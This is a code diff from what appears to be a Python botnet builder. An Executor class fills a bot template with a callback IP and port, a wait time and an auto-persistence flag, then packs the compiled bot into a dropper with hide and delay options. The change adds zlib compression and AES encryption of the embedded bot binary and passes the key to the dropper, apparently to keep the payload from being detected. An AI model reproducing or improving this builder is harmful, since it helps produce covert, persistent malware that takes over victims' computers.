@@ -4,12 +4,14 @@
 
 import os  
 import sys 
+import zlib 
 import shlex 
 import shutil
 import smtplib 
 import tempfile
 from lib.file import File
 from lib.args import Args
+from lib.aes import gen_key, encrypt
 
 try:
     from PyInstaller import __main__ as pyi, is_win
@@ -28,6 +30,7 @@ class Executor(object):
         self.icon = icon
         self.binary = b''
         self.delay = delay
+        self.key = gen_key()
         self.persist = persist
         self.filename = filename
 
@@ -70,21 +73,22 @@ class Executor(object):
 
     def compile_bot(self):
         _dict = {
-                 'addr_ip': repr(self.ip),
-                 'addr_port': str(self.port),
-                 'wait_time': str(self.wait),
-                 'auto_persist': repr(self.persist)
+            'addr_ip': repr(self.ip),
+            'addr_port': str(self.port),
+            'wait_time': str(self.wait),
+            'auto_persist': repr(self.persist)
         }
 
         self.write_template(self.bot_template, self.bot_py_temp, _dict)
         if self.exe:
             with open(self.bot_compiled, 'rb') as f:
-                self.binary = f.read()
+                self.binary = encrypt(zlib.compress(f.read()), self.key)
 
     def compile_dropper(self):
         _dict = {
          'data_name': repr('_{}.exe'.format(self.filename)),
          'data_binary': repr(self.binary),
+         'data_key': repr(self.key),
          'data_hide': str(self.hide),
          'data_delay': str(self.delay)
         }
